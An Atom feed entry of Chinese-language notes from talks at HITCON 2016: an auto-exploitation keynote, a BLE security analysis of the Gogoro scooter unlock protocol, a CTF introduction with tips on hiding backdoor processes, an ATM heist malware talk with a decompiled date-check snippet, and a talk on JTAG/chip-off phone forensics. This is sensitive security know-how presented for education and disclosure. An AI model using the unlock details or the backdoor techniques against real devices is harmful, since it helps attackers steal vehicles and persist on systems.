<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Just for noting</title><link href="https://blog.m157q.tw/" rel="alternate"></link><link href="https://blog.m157q.tw/feeds/tag.hitcon.atom.xml" rel="self"></link><id>https://blog.m157q.tw/</id><updated>2016-07-23T19:45:43+08:00</updated><entry><title>HITCON 2016 CMT</title><link href="https://blog.m157q.tw/posts/2016/07/23/hitcon-2016-cmt/" rel="alternate"></link><published>2016-07-23T19:45:43+08:00</published><updated>2016-07-23T19:45:43+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-07-23:posts/2016/07/23/hitcon-2016-cmt/</id><summary type="html">&lt;h1&gt;Day 1 (2016/07/22 Fri)&lt;/h1&gt;
&lt;h2&gt;Keynote / 從人工搶旗到機器人攻防（From CTF to CGC) 談資安人才培育&lt;/h2&gt;
&lt;h3&gt;Speaker: 交通大學資訊技術服務中心 黃世昆 Shih-Kun Huang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CGC (Cyber Grand Challenge)  &lt;ul&gt;
&lt;li&gt;CQE  &lt;/li&gt;
&lt;li&gt;CFE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ForAllSecure CRS  &lt;ul&gt;
&lt;li&gt;Symbolic Fuzzer =&amp;gt; 深、慢  &lt;/li&gt;
&lt;li&gt;Random Fuzzer =&amp;gt; 淺、快  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CRS Integration Attack  &lt;ul&gt;
&lt;li&gt;Target-aware symbolic fuzzing  &lt;/li&gt;
&lt;li&gt;測、脅、隱、控  &lt;ul&gt;
&lt;li&gt;Fuzzing, Exploit, Anti-mitigation, Post-exploitation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CRS Integration Defense  &lt;/li&gt;
&lt;li&gt;CRAX - World Second Auto Exploitation Generator (Simple Live Demo)  &lt;ul&gt;
&lt;li&gt;Symbolic Execution  &lt;/li&gt;
&lt;li&gt;Concolic Execution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hacker's Tool Chain  &lt;ul&gt;
&lt;li&gt;Bug Fuzzzer  &lt;/li&gt;
&lt;li&gt;Crash Detector / Failure Monitor  &lt;/li&gt;
&lt;li&gt;Exploit Code Generator  &lt;ul&gt;
&lt;li&gt;目前缺少的一塊  &lt;/li&gt;
&lt;li&gt;目前分辨 Hacker 跟 Script Kiddie 的差別就在於會不會撰寫 Exploit，但要是之後 Exploit 能夠自動產生的話，Hacker 與 Script Kiddie 的分界就會消失，屆時 Hacker 又該以什麼為主要價值？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shell-code Forger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;物聯網 BLE 認證機制設計的挑戰：以 Gogoro Smart Scooter 為例&lt;/h2&gt;
&lt;h3&gt;Speaker:  GD&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Bluetooth 4.0 有三種  &lt;ul&gt;
&lt;li&gt;High Speed  &lt;/li&gt;
&lt;li&gt;Classic  &lt;/li&gt;
&lt;li&gt;Low Energy (BLE)  &lt;ul&gt;
&lt;li&gt;類似 HTTP：session-less 有七種 method  &lt;/li&gt;
&lt;li&gt;很容易控制  &lt;ul&gt;
&lt;li&gt;可以在捷運上讓旁邊的小米手環一直振動。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;很多物聯網裝置送的封包都沒加密  &lt;ul&gt;
&lt;li&gt;Security Manager Protocol  &lt;/li&gt;
&lt;li&gt;BLE 4.0 SMP 配對方式  &lt;ul&gt;
&lt;li&gt;Just Works: 沒有保護，很容易被 MITM 攻擊  &lt;/li&gt;
&lt;li&gt;Passkey Entry  &lt;/li&gt;
&lt;li&gt;Out-Of-Band  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLE 4.0 隱私保護  &lt;ul&gt;
&lt;li&gt;硬體識別元 讀取限制  &lt;/li&gt;
&lt;li&gt;硬體識別元 亂數化  &lt;/li&gt;
&lt;li&gt;無硬體識別元，增加驗證機制設計的困難  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gogoro smart scooter  &lt;ul&gt;
&lt;li&gt;Key Fob Unlock (BLE)  &lt;ul&gt;
&lt;li&gt;Better than keeloq  &lt;/li&gt;
&lt;li&gt;類似 Challenge &amp;amp; Response 的過程  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile App (Gateway)  &lt;ul&gt;
&lt;li&gt;交車設定 My Gogoro 帳號  &lt;/li&gt;
&lt;li&gt;App 登入下載 Scooter 資訊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile App Pairing &amp;amp; Unlock  &lt;ul&gt;
&lt;li&gt;配對過程僅 ATT 讀寫資訊，沒有使用 BLE 原生的配對設定。  &lt;/li&gt;
&lt;li&gt;問題定義  &lt;ul&gt;
&lt;li&gt;BLE 未配對，無硬體識別元，如何設計認証機制？ =&amp;gt; App 和機車裏面要有同把 key，而這個 key 從 Server 來。（登入下載到 App 上）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLE Gogoro Service  &lt;ul&gt;
&lt;li&gt;Service UDID 末 8 byte 為 Scooter MAC Address  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;App Protocol 分析  &lt;ul&gt;
&lt;li&gt;發現有大概二十幾組 Command  &lt;ul&gt;
&lt;li&gt;A 開頭為一般資訊查詢  &lt;/li&gt;
&lt;li&gt;B 開頭為 Challenge 相關指令  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unlock 流程  &lt;ul&gt;
&lt;li&gt;Scooter 掃描附近 Peripheral 是否有 GATT Gogoro 服務。 UUID 351AAF0F-末 8 byte 同 Scooter MAC Address 才連上  &lt;/li&gt;
&lt;li&gt;Mobile App 讀取 Scooter 目前狀態，啟用解鎖按鈕。按下按鈕後送出 ECU_Cmd(0xB4) Value 上鎖 0x00, 解鎖 0x01  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;車鑰匙 &lt;code&gt;Security_Key&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ECU_Response=SHA256(ECU_Challenge, Security_Key)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Insecure App Data Storage  &lt;ul&gt;
&lt;li&gt;Token, Certificate 應該放在加密儲存區  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unlock 模擬程式  &lt;ul&gt;
&lt;li&gt;根據上述分析結果，撰寫可 Unlock 已知 Security_Key 的 Scooter 的 Android App。（只要 Security_Key leak 的話就可能會被 Hacker 控制）  &lt;/li&gt;
&lt;li&gt;因此得知：  &lt;ul&gt;
&lt;li&gt;攻擊者只要取得 Security_Key 就能解鎖 Gogoro  &lt;/li&gt;
&lt;li&gt;Security_Key 可被轉移到其他手機使用  &lt;/li&gt;
&lt;li&gt;Scooter 無法驗證 Mobile 裝置識別元  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Security_Key 可能 Leak 的途徑  &lt;ul&gt;
&lt;li&gt;車主在 Gogoro 官網的帳號密碼被破解  &lt;/li&gt;
&lt;li&gt;車主手機的備份檔流出  &lt;/li&gt;
&lt;li&gt;車主手機使用不安全的連線導致 Security_Key 流出  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gogoro 分析結果  &lt;ul&gt;
&lt;li&gt;裝置識別元隱私保護 =&amp;gt; 提高驗證設計難度  &lt;/li&gt;
&lt;li&gt;Insecure App Data Storage 弱點  &lt;/li&gt;
&lt;li&gt;其他可能威脅  &lt;ul&gt;
&lt;li&gt;取 Security_Key API 沒有 SSL Cert Pining 可能被 MITM  &lt;/li&gt;
&lt;li&gt;Challenge-Response 可能被 Relay-Attack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大體來說 Gogoro 系統設計是安全的  &lt;ul&gt;
&lt;li&gt;藍牙傳輸雖然沒有配對與加密，但是傳輸的是一次性的 Challenge/Response  &lt;/li&gt;
&lt;li&gt;在手機端，金鑰基本上是綁手機，除非手機有自己做破解，而且被安裝後門程式，不然不容易直接從手機取得 Security_Key  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;威脅情境  &lt;ul&gt;
&lt;li&gt;車主手機被植入木馬  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;弱點通報廠商  &lt;ul&gt;
&lt;li&gt;Gogoro 處理的態度非常積極  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 裝置認証設計的挑戰  &lt;ul&gt;
&lt;li&gt;無法讀取裝置識別元  &lt;ul&gt;
&lt;li&gt;IoT 裝置事先不認識手機  &lt;/li&gt;
&lt;li&gt;IoT 裝置事先  認識金鑰  &lt;/li&gt;
&lt;li&gt;藉由 Server 把金鑰給手機  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;防止金鑰被複製  &lt;ul&gt;
&lt;li&gt;BLE 4.2 Secure Connections  &lt;/li&gt;
&lt;li&gt;金鑰+手機裝置識別元  &lt;/li&gt;
&lt;li&gt;金鑰 Secure Element 儲存  &lt;/li&gt;
&lt;li&gt;金鑰+ Server SMS OTP  &lt;ul&gt;
&lt;li&gt;綁門號，不綁定手機。  &lt;/li&gt;
&lt;li&gt;SMS 要錢，需要電信門號，IoT 裝置需跟 Server 同步。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;金鑰+ Dual Counter 強化認証  &lt;ul&gt;
&lt;li&gt;綁定手機，可察覺金鑰盜用。  &lt;/li&gt;
&lt;li&gt;未必能阻擋金鑰盜用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;雙計數器強化認証  &lt;ul&gt;
&lt;li&gt;手機只存暫時性的 Key，如果被偷的話，可以 Revoke 掉。  &lt;/li&gt;
&lt;li&gt;真正的 Key 存在 Server  &lt;/li&gt;
&lt;li&gt;如果有其他裝置啟動自己的車子的話，計數器的數字會不 Match，可以察覺到有別人存取過自己的車子。  &lt;/li&gt;
&lt;li&gt;察覺到的話，可以把手機上的暫時性的 Key revoke 掉，換一把新的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;介紹 Bluetooth Low Energy 安全性分析流程  &lt;/li&gt;
&lt;li&gt;Smartphone 透過 BLE 控制 IoT 裝置，需要一套認証機制  &lt;/li&gt;
&lt;li&gt;BLE 4.0 配對有許多限制，故廠商選擇另外設計自己的配對機制。  &lt;/li&gt;
&lt;li&gt;消費者隱私重視下，硬體識別元受限且亂數化。  &lt;/li&gt;
&lt;li&gt;提供一種更好的認証機制：雙計數器強化認証  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;未來展望  &lt;ul&gt;
&lt;li&gt;因為這台每天都要騎，所以不敢拆來研究 XDD  &lt;/li&gt;
&lt;li&gt;Key Fob 晶片演算法研究  &lt;/li&gt;
&lt;li&gt;Challenge nonce 亂數強度  &lt;/li&gt;
&lt;li&gt;是否可從 ECU 或其他管道取得 &lt;code&gt;Security_Key&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;所以手機上那把 &lt;code&gt;Security_Key&lt;/code&gt; 被幹走的話，目前是無法換新的 &lt;code&gt;Security_Key&lt;/code&gt; 的？  &lt;ul&gt;
&lt;li&gt;對，目前是無法被更新的，至於要不要用新的機制，要問 Gogoro。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HMAC 還是需要一把 Key，但那把存在手機上，還是不能避免外洩囉？  &lt;ul&gt;
&lt;li&gt;對，這邊只是用個 counter 來察覺外洩而已，並沒有要保護那把 Key，因為手機只要有 root 的話，就有外洩的風險。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;Security_Key&lt;/code&gt; 不能更換的情況下，二手車是否有風險？  &lt;ul&gt;
&lt;li&gt;對，因為不能更換，等於原車主只要有心，還是可以保留 Security Key。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://thinkingiot.blogspot.tw/"&gt;Le IoT  想想物聯網&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Bluetooth_low_energy"&gt;Bluetooth low energy - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/KeeLoq"&gt;KeeLoq - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Introduction to CTF - BambooFox&lt;/h2&gt;
&lt;h3&gt;Speaker: C.K Chen 陳仲寬&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Why attend CTF challenges?  &lt;ul&gt;
&lt;li&gt;The other way for security training  &lt;ul&gt;
&lt;li&gt;CTF as the training for offensive security  &lt;/li&gt;
&lt;li&gt;Emulate real world problems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Practice your hacking skill  &lt;/li&gt;
&lt;li&gt;Compete with top hackers in the world.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTF  &lt;ul&gt;
&lt;li&gt;The competition to steal data, a.k.a flag, from other computers  &lt;ul&gt;
&lt;li&gt;EX. Stea admin password from a web server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Most pobleams are related to real world  &lt;/li&gt;
&lt;li&gt;Good practices for students even experts.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;History of CTF  &lt;ul&gt;
&lt;li&gt;Starting from DEFCON 4 in 1996  &lt;ul&gt;
&lt;li&gt;Format is a mystery  &lt;/li&gt;
&lt;li&gt;Held every year since 1996  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Regions  &lt;ul&gt;
&lt;li&gt;Japan  &lt;ul&gt;
&lt;li&gt;SECCON, TMCTF, MMACTF  &lt;/li&gt;
&lt;li&gt;特別愛出 QR code 的題目  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;South Korea  &lt;ul&gt;
&lt;li&gt;CodeGate, SECUINSIDE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;China  &lt;ul&gt;
&lt;li&gt;XCTF（聯賽）, BCTF(北京清華), 0CTF（上海交大）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Russia  &lt;ul&gt;
&lt;li&gt;RuCTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;France  &lt;ul&gt;
&lt;li&gt;Nuit du Hack CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Malaysia  &lt;ul&gt;
&lt;li&gt;HITB CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Colombia  &lt;ul&gt;
&lt;li&gt;Backdoor CTF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTFTime  &lt;/li&gt;
&lt;li&gt;Famous CTF Teams  &lt;ul&gt;
&lt;li&gt;PPP (US, CMU)  &lt;/li&gt;
&lt;li&gt;HITCON (TW)  &lt;/li&gt;
&lt;li&gt;217 (TW, NTU)  &lt;/li&gt;
&lt;li&gt;0ops (China, Shanghai Jiao Tong University)  &lt;/li&gt;
&lt;li&gt;Blue-Lotus (China, Tsinghua University)  &lt;/li&gt;
&lt;li&gt;Dragon Sector (Poland)  &lt;/li&gt;
&lt;li&gt;Gallopsled (Danmark)  &lt;/li&gt;
&lt;li&gt;Shellphish (US, UCSB)  &lt;/li&gt;
&lt;li&gt;DEFKOR (South Korea)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTF Types  &lt;ul&gt;
&lt;li&gt;JeoPardy 解題型  &lt;ul&gt;
&lt;li&gt;About 90% CTF are held in this type  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attack &amp;amp; Defense  &lt;ul&gt;
&lt;li&gt;Need good support of networking environment  &lt;/li&gt;
&lt;li&gt;Skill needed  &lt;ul&gt;
&lt;li&gt;Vul discovery and patching  &lt;/li&gt;
&lt;li&gt;Network flow analysis  &lt;/li&gt;
&lt;li&gt;System Administration  &lt;/li&gt;
&lt;li&gt;Backdoor  &lt;ul&gt;
&lt;li&gt;把 process name 改成跟服務的名稱一樣，讓對方不知道要不要砍。  &lt;/li&gt;
&lt;li&gt;用提權的方式放入別人沒辦法砍掉的後門  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Online: iCTF, RuCTF  &lt;/li&gt;
&lt;li&gt;Local: DEFCON Final , HITOCN Final, SECCON Final, XCTF Final, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;King of Hill  &lt;ul&gt;
&lt;li&gt;Local: HoneyMe  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Which CTF to Play?  &lt;ul&gt;
&lt;li&gt;For Beginners  &lt;ul&gt;
&lt;li&gt;Backdoor, CSAW Qualificaiton, ASIS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Advanced  &lt;ul&gt;
&lt;li&gt;DEFCON  &lt;/li&gt;
&lt;li&gt;PladiCTF (hold by PPP)  &lt;/li&gt;
&lt;li&gt;CodeGate (South Korea)  &lt;/li&gt;
&lt;li&gt;SECCON (Japan)  &lt;/li&gt;
&lt;li&gt;PHD Quals  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Expreience Sharing  &lt;ul&gt;
&lt;li&gt;Focus!  &lt;ul&gt;
&lt;li&gt;When you start to CTF, it is best to focus on one type of problem.&lt;br /&gt;
    E.g. Pwn, Reverse, Web  &lt;/li&gt;
&lt;li&gt;只要先讓自己專注於解某一類的題目，壓力比較小。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Following New Techniques  &lt;/li&gt;
&lt;li&gt;Customize Your CTF Toolset  &lt;ul&gt;
&lt;li&gt;Prepare Your own environment  &lt;/li&gt;
&lt;li&gt;E.g., pwntools  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Practice, Practice and Practice  &lt;/li&gt;
&lt;li&gt;Enjoy the Game  &lt;ul&gt;
&lt;li&gt;不要有太大的壓力覺得自己一定要拿多少分數，應該要享受題目，讓自己儘可能從中學到東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;神祕議程：黑客搶銀行&lt;/h2&gt;
&lt;h3&gt;Speaker: cclien&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;20160716 上演 ATM Pwn2Own  （第一銀行提款機被搶 8000 萬新台幣）  &lt;/li&gt;
&lt;li&gt;2010 年的 Blackhat 就有 Live Demo 過 ATM 吐鈔票  &lt;/li&gt;
&lt;li&gt;國外有 ATM 被攻擊的案例嗎  &lt;ul&gt;
&lt;li&gt;Backdoor.Tyupkin - 光碟片吐鈔  &lt;/li&gt;
&lt;li&gt;Carbanak APT 內網策動吐鈔  &lt;/li&gt;
&lt;li&gt;Wincor KDIAG32 維護程式吐鈔  &lt;/li&gt;
&lt;li&gt;俄羅斯和烏克蘭那邊很多提款機的維護人員會跳去作黑產賺外快 （？）  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://bankomatchik.ru/"&gt;bankomatchik&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;CDM300.exe&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;CSCWCING.EXE&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;這個論壇是和 ATM 有關的工程師在討論的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安德魯這個名字在俄羅斯是菜市場名  &lt;/li&gt;
&lt;li&gt;History  &lt;ul&gt;
&lt;li&gt;2013  &lt;ul&gt;
&lt;li&gt;Skimer Trojan  &lt;/li&gt;
&lt;li&gt;Plotus Trojan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2014  &lt;ul&gt;
&lt;li&gt;Tyupkin Trojan (Russia)  &lt;/li&gt;
&lt;li&gt;Anunak 1.0 犯罪集團  &lt;/li&gt;
&lt;li&gt;Wincor Reg Trojan (Russia)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;Carbanak 2.0 犯罪集團 (Global)  &lt;/li&gt;
&lt;li&gt;GreenDispenser Trojan (Mexico)  &lt;/li&gt;
&lt;li&gt;SUCEFUL Trojan (Russia)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;GCMAN Trojan  &lt;/li&gt;
&lt;li&gt;METEL Trojan  &lt;/li&gt;
&lt;li&gt;Anunak 2.0 犯罪集團  &lt;/li&gt;
&lt;li&gt;Wincor CNG Trojan (Taiwan)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DMS 派送機制  &lt;/li&gt;
&lt;li&gt;網路架構圖中，Gateway 為什麼是網路卡？不是 Firewall？猜測是 CISCO 的設備，例如 PIX Firewall  &lt;/li&gt;
&lt;li&gt;吐鈔時間不是寫死的，是用電話與遠端的駭客聯絡，透過遠端協助 telnet 進去 ATM 讓它吐鈔  &lt;/li&gt;
&lt;li&gt;Wincor 的硬體網路上都買得到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不同層面的 ATM 後門攻擊方式  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                          應用軟體層  
                              ||  
                    WOSA/XFS, CEN/XFS 3.0  
                              ||  
OKI SP(硬體) NCR SP   Wincor SP   Hitachi SP   Diebold SP  
                    作業系統 Windows XP/7  
OKI ATM      NCR ATM  Wincor ATM  Hitachi ATM  Diebold ATM  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ATM 吐鈔程式限定 2016 年 7 月  &lt;ul&gt;
&lt;li&gt;可能因為是集團長期佈署及規劃的活動。  &lt;/li&gt;
&lt;li&gt;可能是買斷的軟體，設定時間後出貨，所以可以賣給其他人，這只是其中一個買家。  &lt;/li&gt;
&lt;li&gt;從程式碼看來，英文用的很正確，程式應該不是俄羅斯人所撰寫。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{  
    v9 = v20;  
    *(_DWORD *)&amp;amp;SystemTime.wYear = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wDayOfWeek = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wHour = 0;  
    *(_DWORD *)&amp;amp;SystemTime.wSecond = 0;  
    GetSystemTime(&amp;amp;SystemTime);  
    if ( SystemTime.wYear != 2016 || SystemTime.wMonth != 7 || )  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;新聞一直說內鬼，到底有沒有內鬼？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不太可能是內鬼所為。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;這次破案的關鍵可能在哪？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;台灣到處都有攝影機的畫面可以調閱。  &lt;/li&gt;
&lt;li&gt;台灣的外國人太少，會特別被注意。尤其到宜蘭吃飯還會被餐廳老闆娘要求合照。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;台灣是鬼島，封鎖機場跟地下匯兌的話，人跟錢都出不去。  &lt;/li&gt;
&lt;li&gt;第一銀行決定把同機型(Wincor PC 1500)通通換掉，有沒有用？  &lt;ul&gt;
&lt;li&gt;典型的「頭痛醫頭，腳痛醫腳。」  &lt;/li&gt;
&lt;li&gt;每一型的 ATM 都有人在討論漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在場的俄羅斯 Native Speaker 表示：「聽不太懂台灣那位幫安得魯翻譯俄文的女孩講的俄文」  &lt;/li&gt;
&lt;li&gt;最冤枉的就是 ATM，因為不是 ATM 本身的漏洞，是派送機制的管理跟網路管理上的漏洞。  &lt;/li&gt;
&lt;li&gt;真正幕後的 Hacker 並沒有被抓到，抓到的只是車手，只要換一批車手就可以繼續幹一樣的事情，如果能夠透過後續的調查，還原入侵的手法，藉此去防範，才能有效解決這個問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Advanced Mobile Device Analysis using JTAG and Chip-Off&lt;/h2&gt;
&lt;h3&gt;Speaker: Kelvin Wong&lt;/h3&gt;
&lt;h4&gt;JTAG&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;What is JTAG  &lt;ul&gt;
&lt;li&gt;Joint Test Action Group  &lt;/li&gt;
&lt;li&gt;Test Access Ports (TAPs) to collect raw data from a memory chips  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Not chip-off and ISP  &lt;ul&gt;
&lt;li&gt;Chip-Off: Remove the chip from the device  &lt;/li&gt;
&lt;li&gt;In-Circular System Programming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Extreme physical data acquisition  &lt;/li&gt;
&lt;li&gt;Advanced technique  &lt;/li&gt;
&lt;li&gt;Soldering and De-soldering （焊接）  &lt;/li&gt;
&lt;li&gt;JTAG Box  &lt;ul&gt;
&lt;li&gt;Riff BOX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JTAG Finder  &lt;/li&gt;
&lt;li&gt;Mounting Frame &amp;amp; Arms  &lt;/li&gt;
&lt;li&gt;TAP  &lt;ul&gt;
&lt;li&gt;TCK: test clock  &lt;/li&gt;
&lt;li&gt;TMS: test mode state  &lt;/li&gt;
&lt;li&gt;TDI: test data in  &lt;/li&gt;
&lt;li&gt;TDO: test data out  &lt;/li&gt;
&lt;li&gt;TRST: test reset  &lt;/li&gt;
&lt;li&gt;NRST: normal reset  &lt;/li&gt;
&lt;li&gt;RTCK: return clock  &lt;/li&gt;
&lt;li&gt;GND: ground  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JTAG Molex and Jig  &lt;/li&gt;
&lt;li&gt;Demonstration using Riff Box  &lt;ul&gt;
&lt;li&gt;HTC EVO 3G  &lt;/li&gt;
&lt;li&gt;Android OS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decoding the Lock Pattern  &lt;ul&gt;
&lt;li&gt;gesture.key  &lt;/li&gt;
&lt;li&gt;20 bytes in length  &lt;/li&gt;
&lt;li&gt;open source tools: Android Pattern Lock Cracker  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Chip-Off&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;What is Chip-Off?  &lt;ul&gt;
&lt;li&gt;eMMC cihp  &lt;/li&gt;
&lt;li&gt;NAND Flash  &lt;/li&gt;
&lt;li&gt;Disassemble &amp;amp; Re-balling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
